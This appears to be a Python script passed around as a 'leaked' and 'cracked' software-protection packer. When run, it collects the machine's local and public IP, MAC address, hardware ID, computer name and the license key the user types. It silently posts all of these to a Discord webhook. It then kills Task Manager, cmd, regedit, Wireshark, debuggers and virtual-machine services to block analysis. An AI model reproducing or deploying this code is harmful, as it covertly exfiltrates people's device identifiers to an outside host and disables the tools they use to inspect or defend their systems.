#eintim23's packer leaked 2024 legit no clickbait
#coded by emmy :D


import requests
import sys
import colorama
import psutil
import socket
import uuid
import subprocess
import re
from colorama import Fore, Back, Style
from colorama import just_fix_windows_console
from termcolor import colored

def get_hwid():
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

def get_mac():
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

def get_pc_name():
    return socket.gethostname()

def get_public_ip():
    try:
        response = requests.get('https://ifconfig.co/ip')
        if response.status_code == 200:
            return response.text.strip()
        else:
            return None
    except Exception as e:
        return None

def send_to_discord(webhook_url, data):
    try:
        embed = {
            "title": "System Information",
            "fields": [
                {"name": "IP Address", "value": data["ip_address"]},
                {"name": "Public IP Address", "value": data["public_ip"]},
                {"name": "HWID", "value": data["hwid"]},
                {"name": "MAC Address", "value": data["mac_address"]},
                {"name": "PC Name", "value": data["pc_name"]},
                {"name": "License Key", "value": data["license_key"]}
            ]
        }
        payload = {"embeds": [embed]}
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            pass  
        else:
            print("")
            print("")
    except Exception as e:
        print("")


ip_address = socket.gethostbyname(socket.gethostname())
hwid = get_hwid()
mac_address = get_mac()
pc_name = get_pc_name()
public_ip = get_public_ip()


data = {
    "ip_address": ip_address,
    "public_ip": public_ip,
    "hwid": hwid,
    "mac_address": mac_address,
    "pc_name": pc_name,
    "license_key": None  
}

print("[:sob:] eintim's protection cracked by emmy")
license_key = input(Fore.MAGENTA + "[?] Enter your license key: ")
data["license_key"] = license_key  

# Send data to Discord webhook
webhook_url = "YOUR HOOK"
send_to_discord(webhook_url, data)

# Fetch content from the URL
url = "https://pastebin.com/raw/(your pastebin link code)"
response = requests.get(url)

if response.status_code == 200:
    content = response.text
    if license_key in content.split('\n'):  
        print(Fore.RED + "[+] License key is valid, fuck you.")
        print(Fore.LIGHTGREEN_EX + "[*] Welcome to eintim23's protection (cracked by emmy)")
    else:
        print(Fore.RED + "[-] Invalid license key.")

# Kill processes
def kill_processes(process_names):
    for proc in psutil.process_iter():
        if proc.name().lower() in process_names:
            proc.kill()

process_to_kill = [
    "http toolkit.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "fiddler.exe",
    "charles.exe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "df5serv.exe",
    "processhacker.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "vmwareuser",
    "vgauthservice.exe",
    "vmacthlp.exe",
    "x96dbg.exe",
    "vmsrvc.exe",
    "x32dbg.exe",
    "vmusrvc.exe",
    "prl_cc.exe",
    "prl_tools.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "ksdumperclient.exe",
    "ksdumper.exe",
    "joeboxserver.exe",
    "xenservice.exe"
]

if __name__ == "__main__":
    kill_processes(process_to_kill)
